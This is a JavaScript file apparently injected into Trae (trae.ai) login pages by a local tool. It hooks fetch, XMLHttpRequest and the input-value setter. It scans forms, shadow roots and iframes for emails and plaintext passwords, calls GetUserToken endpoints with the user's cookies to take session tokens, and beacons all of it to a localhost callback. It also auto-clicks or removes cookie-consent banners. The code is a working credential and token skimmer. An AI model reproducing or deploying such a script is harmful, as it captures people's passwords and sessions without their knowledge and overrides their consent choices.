(function() {
  if (window.__traeAutoInjected) return;
  window.__traeAutoInjected = true;

  const callback = "http://127.0.0.1:__PORT__/callback";
  let loginTriggered = false;
  const normalize = (text) => (text || "").toLowerCase();
  const STORAGE_EMAIL_KEY = "__trae_login_email";
  const STORAGE_PASSWORD_KEY = "__trae_login_password";
  let capturedEmail = "";
  let capturedPassword = "";
  let lastSentEmail = "";
  let lastSentPassword = "";
  const boundInputs = new WeakSet();
  try {
    capturedEmail = sessionStorage.getItem(STORAGE_EMAIL_KEY) || "";
    capturedPassword = sessionStorage.getItem(STORAGE_PASSWORD_KEY) || "";
  } catch {}
  const captureEmail = (value) => {
    const next = (value || "").trim();
    if (next) {
      capturedEmail = next;
      try {
        sessionStorage.setItem(STORAGE_EMAIL_KEY, capturedEmail);
      } catch {}
    }
  };
  const capturePassword = (value) => {
    const next = (value || "").toString();
    if (next) {
      capturedPassword = next;
      try {
        sessionStorage.setItem(STORAGE_PASSWORD_KEY, capturedPassword);
      } catch {}
    }
  };
  const maybeCapture = (el) => {
    if (!el || !el.getAttribute) return;
    const type = normalize(el.getAttribute("type") || "");
    const name = normalize(el.getAttribute("name") || "");
    const autocomplete = normalize(el.getAttribute("autocomplete") || "");
    const placeholder = normalize(el.getAttribute("placeholder") || "");
    const value = typeof el.value === "string" ? el.value : "";
    const trimmedValue = value.trim();
    if (type === "password" || name.includes("password") || autocomplete.includes("password") || placeholder.includes("password")) {
      capturePassword(value);
    }
    if (
      type === "email" ||
      name.includes("email") ||
      name.includes("account") ||
      autocomplete.includes("email") ||
      placeholder.includes("email") ||
      placeholder.includes("邮箱")
    ) {
      captureEmail(value);
    } else if (!capturedEmail && trimmedValue.includes("@")) {
      captureEmail(trimmedValue);
    }
  };
  const bindInput = (input) => {
    if (!input || boundInputs.has(input) || !input.addEventListener) return;
    boundInputs.add(input);
    const handler = () => {
      maybeCapture(input);
      syncCredentials();
    };
    input.addEventListener("input", handler);
    input.addEventListener("change", handler);
    input.addEventListener("blur", handler);
  };
  const applyCredentialField = (key, value) => {
    if (typeof value !== "string") return;
    const lower = normalize(key);
    if (lower.includes("email")) {
      captureEmail(value);
    }
    if (
      lower.includes("password") ||
      lower.includes("passwd") ||
      lower === "pwd" ||
      lower.endsWith("password")
    ) {
      capturePassword(value);
    }
  };
  const extractCredentialsFromBody = (body) => {
    if (!body) return;
    try {
      if (typeof body === "string") {
        const trimmed = body.trim();
        if (!trimmed) return;
        if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
          const data = JSON.parse(trimmed);
          if (data && typeof data === "object") {
            Object.keys(data).forEach((key) => applyCredentialField(key, data[key]));
          }
        } else {
          const params = new URLSearchParams(trimmed);
          params.forEach((value, key) => applyCredentialField(key, value));
        }
        syncCredentials();
        return;
      }
      if (body instanceof URLSearchParams) {
        body.forEach((value, key) => applyCredentialField(key, value));
        syncCredentials();
        return;
      }
      if (typeof FormData !== "undefined" && body instanceof FormData) {
        body.forEach((value, key) => {
          if (typeof value === "string") {
            applyCredentialField(key, value);
          }
        });
        syncCredentials();
        return;
      }
    } catch {}
  };
  const hookValueSetter = () => {
    try {
      if (window.__traeValueHooked) return;
      if (!window.HTMLInputElement) return;
      const proto = HTMLInputElement.prototype;
      const desc = Object.getOwnPropertyDescriptor(proto, "value");
      if (!desc || !desc.set || !desc.get) return;
      Object.defineProperty(proto, "value", {
        get: function() {
          return desc.get.call(this);
        },
        set: function(val) {
          desc.set.call(this, val);
          try {
            maybeCapture(this);
            syncCredentials();
          } catch {}
        }
      });
      window.__traeValueHooked = true;
    } catch {}
  };
  const getInputFromEvent = (event) => {
    const path = typeof event.composedPath === "function" ? event.composedPath() : (event.path || []);
    if (path && path.length) {
      for (const node of path) {
        if (node && node.tagName && node.tagName.toLowerCase() === "input") {
          return node;
        }
      }
    }
    return event.target;
  };
  const scanRoot = (root) => {
    if (!root) return;
    try {
      const inputs = root.querySelectorAll ? root.querySelectorAll("input") : [];
      if (inputs && inputs.length) {
        inputs.forEach((input) => {
          maybeCapture(input);
          bindInput(input);
        });
      }
      const elements = root.querySelectorAll ? root.querySelectorAll("*") : [];
      if (elements && elements.length) {
        elements.forEach((el) => {
          if (el && el.shadowRoot) {
            scanRoot(el.shadowRoot);
          }
          if (el && el.tagName && el.tagName.toLowerCase() === "iframe") {
            try {
              scanRoot(el.contentDocument || (el.contentWindow && el.contentWindow.document));
            } catch {}
          }
        });
      }
    } catch {}
  };
  const scanInputs = () => {
    scanRoot(document);
    syncCredentials();
  };
  const tryAcceptCookies = () => {
    const cookieSelectors = [
      'button.cm__btn',
      '.cm__btn[role="button"]',
      '.cm__btn'
    ];
    for (const selector of cookieSelectors) {
      const btn = document.querySelector(selector);
      if (btn) {
        btn.click();
        return true;
      }
    }
    const candidates = Array.from(
      document.querySelectorAll("button, [role='button'], input[type='button'], input[type='submit'], a")
    );
    const matchText = (text) => {
      const val = (text || "").toLowerCase();
      return (
        val.includes("got it") ||
        val.includes("accept") ||
        val.includes("agree") ||
        val.includes("允许") ||
        val.includes("同意")
      );
    };
    for (const el of candidates) {
      const text = el.innerText || el.textContent || "";
      if (matchText(text)) {
        el.click();
        return true;
      }
    }
    const wrapper = document.querySelector(".cm-wrapper, .cc__wrapper, .cookie-banner, .cookie-consent");
    if (wrapper) {
      wrapper.remove();
      return true;
    }
    return false;
  };
  const sendPayload = (payload) => {
    const params = new URLSearchParams();
    Object.keys(payload || {}).forEach((key) => {
      const value = payload[key];
      if (value === undefined || value === null || value === "") return;
      params.append(key, value);
    });
    if (capturedEmail) params.append("email", capturedEmail);
    if (capturedPassword) params.append("password", capturedPassword);
    const url = callback + "?" + params.toString();
    if (navigator.sendBeacon) {
      navigator.sendBeacon(url);
    } else {
      fetch(url, { mode: "no-cors" });
    }
  };
  const syncCredentials = () => {
    if (!capturedEmail && !capturedPassword) return;
    if (capturedEmail === lastSentEmail && capturedPassword === lastSentPassword) return;
    lastSentEmail = capturedEmail;
    lastSentPassword = capturedPassword;
    sendPayload({ state: "credentials" });
  };
  const normalizeUrl = (raw) => {
    if (!raw) return "";
    try {
      return new URL(raw, location.href).toString();
    } catch {
      return String(raw);
    }
  };

  const sendToken = (token, url) => {
    if (!token) return;
    loginTriggered = true;
    sendPayload({ token, url: normalizeUrl(url) });
  };
  const sendState = (state, href) => {
    if (!state) return;
    loginTriggered = true;
    sendPayload({ state, href: href || "" });
  };
  const isLoginCompleteUrl = (href) => {
    if (!href) return false;
    const lower = href.toLowerCase();
    if (lower.includes("/login")) return false;
    if (lower.includes("passport")) return false;
    if (lower.includes("sign-up") || lower.includes("signup") || lower.includes("register")) return false;
    if (lower.includes("terms") || lower.includes("privacy")) return false;
    return true;
  };
  const parseToken = (data) => {
    if (!data) return null;
    return (
      data.result?.token ||
      data.result?.Token ||
      data.Result?.token ||
      data.Result?.Token ||
      null
    );
  };

  const markLoginTriggered = () => {
    loginTriggered = true;
  };
  const tryFetch = async () => {
    const endpoints = [
      "https://api-sg-central.trae.ai/cloudide/api/v3/common/GetUserToken",
      "https://api-us-east.trae.ai/cloudide/api/v3/common/GetUserToken"
    ];
    const headers = {
      "content-type": "application/json",
      "accept": "application/json, text/plain, */*",
      "origin": "https://www.trae.ai",
      "referer": "https://www.trae.ai/"
    };
    for (const endpoint of endpoints) {
      try {
        const res = await fetch(endpoint, {
          method: "POST",
          credentials: "include",
          headers,
          body: "{}"
        });
        const data = await res.json();
        const token = parseToken(data);
        if (token) {
          sendToken(token, res.url);
          return;
        }
      } catch {}
    }
  };

  const hookFetch = () => {
    const orig = window.fetch;
    window.fetch = async (...args) => {
      try {
        const input = args[0];
        const init = args[1];
        if (init && init.body) {
          extractCredentialsFromBody(init.body);
        } else if (input && typeof input === "object" && typeof input.clone === "function") {
          input.clone().text().then((text) => extractCredentialsFromBody(text)).catch(() => {});
        }
      } catch {}
      const res = await orig(...args);
      try {
        if (typeof res.url === "string" && res.url.includes("GetUserToken")) {
          const data = await res.clone().json();
          const token = parseToken(data);
          if (token) sendToken(token, res.url);
        }
      } catch {}
      return res;
    };
  };

  const hookXHR = () => {
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
      this.__trae_url = url;
      return origOpen.apply(this, [method, url, ...rest]);
    };
    XMLHttpRequest.prototype.send = function(body) {
      try {
        extractCredentialsFromBody(body);
      } catch {}
      this.addEventListener("load", function() {
        try {
          if ((this.__trae_url || "").includes("GetUserToken")) {
            const data = JSON.parse(this.responseText);
            const token = parseToken(data);
            if (token) sendToken(token, this.__trae_url);
          }
        } catch {}
      });
      return origSend.apply(this, arguments);
    };
  };

  hookFetch();
  hookXHR();
  hookValueSetter();
  tryFetch();
  tryAcceptCookies();
  scanInputs();
  setInterval(tryFetch, 3000);
  setInterval(tryAcceptCookies, 1500);
  setInterval(scanInputs, 2000);
  try {
    const observer = new MutationObserver(() => scanInputs());
    const target = document.documentElement || document;
    observer.observe(target, { childList: true, subtree: true });
  } catch {}
  document.addEventListener("submit", () => {
    scanInputs();
    markLoginTriggered();
  }, true);
  syncCredentials();
  document.addEventListener("click", (event) => {
    const target = event.target;
    if (!target || !target.closest) return;
    scanInputs();
    const button = target.closest("button, [role='button'], a, input[type='button'], input[type='submit']");
    if (!button) return;
    const text = normalize(button.innerText || button.textContent || button.getAttribute("aria-label"));
    if (
      text.includes("log in") ||
      text.includes("login") ||
      text.includes("sign in") ||
      text.includes("sign-in") ||
      text.includes("github") ||
      text.includes("google") ||
      text.includes("continue") ||
      text.includes("登录") ||
      text.includes("继续") ||
      text.includes("授权")
    ) {
      markLoginTriggered();
    }
  }, true);
  document.addEventListener("input", (event) => {
    const target = getInputFromEvent(event);
    if (!target) return;
    maybeCapture(target);
    syncCredentials();
    const targetType = target.getAttribute ? normalize(target.getAttribute("type") || "") : "";
    if (targetType === "password") markLoginTriggered();
  }, true);
  let lastHref = location.href;
  let stateSent = false;
  const checkHref = () => {
    const href = location.href;
    if (href !== lastHref) {
      lastHref = href;
      if (!stateSent && isLoginCompleteUrl(href)) {
        stateSent = true;
        sendState("logged_in", href);
        tryFetch();
      }
    }
  };
  setInterval(checkHref, 1000);
  if (isLoginCompleteUrl(location.href)) {
    stateSent = true;
    sendState("logged_in", location.href);
    tryFetch();
  }
})();
